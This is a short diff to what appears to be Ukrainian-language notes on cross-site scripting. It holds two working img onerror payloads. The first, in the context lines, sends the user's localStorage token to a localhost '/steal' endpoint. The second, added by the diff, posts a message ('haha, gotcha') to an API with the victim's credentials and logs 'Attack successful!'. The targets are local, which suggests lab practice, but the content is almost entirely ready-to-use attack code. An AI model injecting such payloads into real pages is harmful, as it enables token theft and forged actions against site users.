@@ -6,3 +6,10 @@
 
 відправка токена користувача на сервер:
 <img src="x" onerror=" fetch('http://localhost:4000/steal?token=' + localStorage.getItem('token')) " />
+
+<img src="x" onerror="fetch('http://localhost:3000/api/post', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ text: 'хаха, попався' }),
+credentials: 'include'
+}).then(() => console.log('Атака успішна!'))" />
